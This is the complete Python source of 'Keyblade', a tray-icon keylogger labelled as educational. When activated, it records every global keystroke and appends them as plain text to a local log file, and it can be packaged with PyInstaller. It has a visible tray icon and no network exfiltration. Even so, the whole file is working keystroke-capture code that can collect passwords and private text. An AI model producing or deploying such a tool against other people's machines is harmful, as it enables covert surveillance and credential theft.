# import all necessary modules
from pynput.keyboard import Key, Listener, Controller
from infi.systray import SysTrayIcon
# from infi.systray import win32_adapter  # no use, here
import sys
import os
import asyncio


"""
** Keyblade **
* A Python simple keyboard listener.
* Log your keyboard inputs and dont miss anything!
* Only for educational purpose!
* Simple tray app with Python, using pynput & infi.systray modules.
* User can press -> "Activate"
                    "Deactivate": <"Deactivate" + Esc> 
                    "Quit": "Quit"  
  options from taskbar icon. 
"""


# class MyException(Exception): pass  # test


class Keyblade:
    # *** Attributes ***
    def __init__(self):
        # ** initialize attributes **
        # * taskbar properties *
        self.title = "Keyblade"
        self.ico = self.resource_path("keyblade.ico")
        self.trayActivate = ((self.title, None, lambda systray: None),
                             ("Activate", None, lambda systray: self.listener_state(state=1)))  # tray
        self.trayDeactivate = ((self.title, None, lambda systray: None),
                               ("Deactivate", None, lambda systray: self.listener_state(state=2)))  # options

        # * variables *
        self.start = False
        self.keys = []
        self.state = 0
        self.listener = True
        self.path = ''
        self.quit = False

        # * tray *
        self.systray = SysTrayIcon(self.ico, self.title, self.trayActivate, on_quit=self.quit_root)

        # * async event loop *
        self.loop = asyncio.get_event_loop()

    # *** Methods ***

    def listener_state(self, state):
        # ** switch event listener state **
        self.state = state
        # print('\n'.join(dir(Controller)))  # test

    async def key_listener(self):
        # ** keyboard event listener **
        while self.listener:
            if self.state == 1:
                self.systray.update(menu_options=self.trayDeactivate)  # pull request, github.com/MagTun/infi.systray
                try:
                    with Listener(on_press=self.pressed_key, on_release=self.release_input) as listener:
                        listener.join()
                finally:
                    listener.stop()
            if self.state == 2:
                # print("self.state")  # test
                line = '\n'
                if self.keys:
                    self.keys.insert(len(self.keys), line)
                    self.write_key()
                    self.keys.clear()
                self.state = 0
                self.systray.update(menu_options=self.trayActivate)
            # print(self.state)  # test
            await asyncio.sleep(2)

    def pressed_key(self, key):
        # ** check pressed key **
        char = str(key).strip("'")
        if len(char) == 1:
            self.keys.append(char)
        elif char == "Key.space":
            self.keys.append(" ")
        elif self.keys and char == "Key.backspace":
            self.keys.pop()
        # print(len(char), char)  # test
        if not len(self.keys) % 64:
            line = '\n'
            self.keys.append(line)
            self.write_key()
            self.keys.clear()

    def write_key(self):
        # ** log keys **
        if not self.path:
            directory = os.path.dirname(os.path.abspath(sys.argv[0]))
            file = "keyblade"
            self.path = os.path.join(directory, file)
        key = "".join(self.keys).lstrip('\n')
        with open(self.path, "a") as f:
            f.write(key)

    def release_input(self, key):
        # ** stop listener **
        if self.quit or self.state == 2 and key == Key.esc:
            return False
        elif self.state == 2:
            self.state = 1

    def quit_root(self, systray):
        # ** quit app **
        self.quit = True
        keyboard = Controller()
        keyboard.tap(Key.esc)
        self.state = 2
        self.listener = False
        # win32_adapter.DestroyWindow(systray._hwnd)  # no use, here

    @staticmethod
    def resource_path(relative_path):
        # ** absolute path to resource, works for dev and for PyInstaller **
        base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
        return os.path.join(base_path, relative_path)

    def run(self):
        # ** run app **
        self.systray.start()  # tray
        # * async method key_listener *
        self.loop.run_until_complete(self.key_listener())
        self.loop.close()


def main():
    # ** Keyblade instances **
    key_listener = Keyblade()
    key_listener.run()  # start instance


if __name__ == '__main__':
    main()  # executed only from keyblade.py
